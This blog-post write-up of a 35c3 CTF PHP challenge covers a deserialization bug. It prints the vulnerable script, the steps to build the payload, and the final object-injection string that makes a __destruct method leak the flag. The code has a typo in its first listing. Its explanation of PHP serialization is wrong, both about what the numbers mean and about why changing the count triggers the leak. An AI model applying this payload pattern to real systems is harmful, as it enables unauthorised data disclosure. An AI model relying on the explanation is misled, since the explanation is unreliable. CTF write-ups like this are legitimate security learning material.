---
layout: post
title: "35c3c php challenge write up"
categories: writeup web
---

# 35c3c CTF: php
I recently participated in the 35c3c ctf. I have enough time to do a quick write up
and this vulnerability class is intriguing to me.
## First impressions
When first downloading the included file there is a tar archive with one file.
The file is a simple php script (the game ran it on a nc server). Opening up the file I can clearly
see the vaulnarability. Its contents are as follows.

{% highlight php %}
<?php
line = trim(fgets(STDIN));

$flag = file_get_contents('/flag');

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}

$a = @unserialize($line);

throw new Exception('Well that was unexpected…');

echo $a;
?>

{% endhighlight %}

The vulnerability is a deserialization bug. That when done right allows us too get the flag.

## Exploitation
This bug is fairly simple to exploit. Since we have source code that we can modify we can echo out to the screen the serialized string of a instance of `class B`.
We do that by modifying the code to this.
{% highlight php %}
<?php

$line = trim(fgets(STDIN));

$flag = file_get_contents('/flag');

class B {
  function __destruct() {
    global $flag;
    echo $flag;
  }
}
$f = new B();
echo serialize($f);
$a = @unserialize($line);

throw new Exception('Well that was unexpected…');

echo $a;
?>

{% endhighlight %}

We then run `php php.php` and get the serialized string. `O:1:"B":0:{}`. To actually get the program to print the flag
we have to change the `0` in the serialized string too a `1`. After that you run the program and paste in `O:1:"B":1:{}` into stdin.
The program responds with the flag text.

## How this works.
### Magic methods and deserilization bugs
This is a deserilization bug. A deserilization bug occurs when serialized objects are managed incorrectly.
So when the code calls `unserialize()` on a line from stdin it is inherently trusting the user to supply a serialized object.
That is part one of the vulnerability, what makes deserilization bugs dangerous is the second part. Look at `class B`, specifically the `__destruct` method.
`__destruct` is a magic method or a method that is run without being called by the programer. In this case it is called when the object is deleted when the runtime determines that the object is nolonger needed.
By having control over the string that gets passed too `unserialize` we can create a new instance of `class B` and control its inputs.

### Php object serialization syntax
This part is something that you need to have a tiny understading of, but not a large one.
Our exploit for the serialized object is `O:1:"B":1:{}` but the program prints out `O:1:"B":0:{}` when echo out the serialized text.
To put this simply the string starts with an `O` for object then is followed by a `:` which acts a seperator. The number after the separator is the number of arguments that `class B` takes. After that we have a `"B"` which means its a `class B` object. Followed by another seperator and then the "magic" part.
This number is the amount values in `class B`. When we call `serialize` on our instance of `class B` it removes the global variable from the serialized text. By manually manipulating that value from a `0` to a `1` we are able to have our object recognized the global variable.
If you want a more indepth explination of php serialization check out [php internals][ref].


[ref]: http://www.phpinternalsbook.com/classes_objects/serialization.html
